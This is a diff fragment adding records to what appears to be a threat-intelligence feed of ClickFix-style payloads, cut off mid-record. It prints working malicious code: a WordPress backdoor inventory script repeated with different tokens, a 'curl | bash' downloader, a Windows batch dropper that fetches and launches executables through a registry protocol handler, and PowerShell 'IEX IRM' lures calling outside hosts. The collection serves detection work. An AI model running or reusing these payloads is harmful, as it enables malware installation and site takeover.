+    "Pattern": "$tok='iaXlHaxrb0rWWWATQdMTOrLHbVLi_AsID_adnNWo_Aw';$id='f0e7beb60ab95843';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T15:26:16.738000+00:00",
+    "LastSeen": "2026-11-10T15:26:16.738000+00:00",
+    "ReportIds": [
+      "cmwauem4m04gp0omlvnwmefxk"
+    ],
+    "PayloadExamples": [
+      "$tok='iaXlHaxrb0rWWWATQdMTOrLHbVLi_AsID_adnNWo_Aw';$id='f0e7beb60ab95843';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='p1Et6yOYKMIZqq1wzB__rYqOrgzY0wXq5GAcV1sC5u8';$id='f228f8e851cdca48';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T06:25:03.452000+00:00",
+    "LastSeen": "2026-11-12T06:25:03.452000+00:00",
+    "ReportIds": [
+      "cmwd5yaxj01md0omldtwh1s8o"
+    ],
+    "PayloadExamples": [
+      "$tok='p1Et6yOYKMIZqq1wzB__rYqOrgzY0wXq5GAcV1sC5u8';$id='f228f8e851cdca48';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='rO-ylacrSAKpO7_kCE5dbfLPfeLYA3niCWjIcIoe1tQ';$id='1d8c241bd4bd770e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T08:43:19.895000+00:00",
+    "LastSeen": "2026-11-09T08:43:19.895000+00:00",
+    "ReportIds": [
+      "cmw90kkhu2g8v0omlulfb5yc5"
+    ],
+    "PayloadExamples": [
+      "$tok='rO-ylacrSAKpO7_kCE5dbfLPfeLYA3niCWjIcIoe1tQ';$id='1d8c241bd4bd770e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='uhp5i5k-CQBKaraPgYTHkA86HhVD_GgzXeO6FXd2-ZE';$id='6b84c10845efd51f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T06:08:35.375000+00:00",
+    "LastSeen": "2026-11-12T06:08:35.375000+00:00",
+    "ReportIds": [
+      "cmwd5d4hs01110oml0h6e0voj"
+    ],
+    "PayloadExamples": [
+      "$tok='uhp5i5k-CQBKaraPgYTHkA86HhVD_GgzXeO6FXd2-ZE';$id='6b84c10845efd51f';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='w12RZCGUfbGwNtu-O5H-263-W-9YfmOgTIMX2C3GEmw';$id='6cc5363fc43fc247';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T23:46:47.689000+00:00",
+    "LastSeen": "2026-11-11T23:46:47.689000+00:00",
+    "ReportIds": [
+      "cmwcrq4tf0d9w0omlc3dtk07l"
+    ],
+    "PayloadExamples": [
+      "$tok='w12RZCGUfbGwNtu-O5H-263-W-9YfmOgTIMX2C3GEmw';$id='6cc5363fc43fc247';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '8jewg3sn.evine.store/?ublib=ef0ccd03-e149-48b1-8b9a-25a494a78424')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T23:37:58.630000+00:00",
+    "LastSeen": "2026-11-11T23:37:58.630000+00:00",
+    "ReportIds": [
+      "cmwcresks0cyc0oml2imzr62e"
+    ],
+    "PayloadExamples": [
+      "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '8jewg3sn[.]evine[.]store/?ublib=ef0ccd03-e149-48b1-8b9a-25a494a78424')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+    ]
+  },
+  {
+    "Pattern": "@echo off\nif \"%~1\"==\"_h\" goto :work\nstart \"\" /min cmd /c call \"%~f0\" _h\nexit /b\n:work\ntimeout /t 1 >nul\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\nset \"l=%PUBLIC%\\v.txt\"\nmd \"%d%\" 2>nul\ncd /d \"%d%\"\necho z>>\"%l%\"\ndel /q v.txt 2>nul\ndel /q vclreg.exe 2>nul\ndel /q vclx370.dat 2>nul\nif exist vclreg.exe echo lockexe>>\"%l%\"\nif exist vclx370.dat echo lockbpl>>\"%l%\"\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe <URL> <nul\necho x%errorlevel%>>\"%l%\"\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat <URL> <nul\necho b%errorlevel%>>\"%l%\"\ndel /q vclreg.exe:Zone.Identifier 2>nul\ndel /q vclx370.dat:Zone.Identifier 2>nul\nver >nul\n>t echo VFOjtWRN microhash9382.com\nif exist vclreg.exe echo exe>>\"%l%\"\nif exist vclx370.dat echo bpl>>\"%l%\"\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\nif exist vclreg.exe if exist vclx370.dat (\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\necho r%errorlevel%>>\"%l%\"\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\n)\necho s%errorlevel%>>\"%l%\"\ntimeout /t 1 >nul\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\ndel /q \"%TEMP%\\t.url\" 2>nul",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T12:50:13.353000+00:00",
+    "LastSeen": "2026-11-12T12:50:13.353000+00:00",
+    "ReportIds": [
+      "cmwdjpmnl04eq0omlovw4ivj8"
+    ],
+    "PayloadExamples": [
+      "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://microhash9382[.]com/ue/x/VFOjtWRN <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://microhash9382[.]com/ue/b/VFOjtWRN <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo VFOjtWRN microhash9382[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul"
+    ]
+  },
+  {
+    "Pattern": "ClickFix Win+R instruction: ...43a4-B972-7b11871881A1 | IEX IRM <URL> | IEX Press Windows Key + X Ctrl + V...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T21:34:36.627000+00:00",
+    "LastSeen": "2026-11-10T21:34:36.627000+00:00",
+    "ReportIds": [
+      "cmwb7kahw01v40nmlsgwwe4r9"
+    ],
+    "PayloadExamples": [
+      "ClickFix Win+R instruction: ...43a4-B972-7b11871881A1 | IEX IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX Press Windows Key + X Ctrl + V..."
+    ]
+  },
+  {
+    "Pattern": "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n.jsdelivr.net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n.jsdelivr.net/g\"h\"/447349472...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T21:31:27.980000+00:00",
+    "LastSeen": "2026-11-09T21:31:27.980000+00:00",
+    "ReportIds": [
+      "cmw9s0e8w050u0oml3hvppp7a"
+    ],
+    "PayloadExamples": [
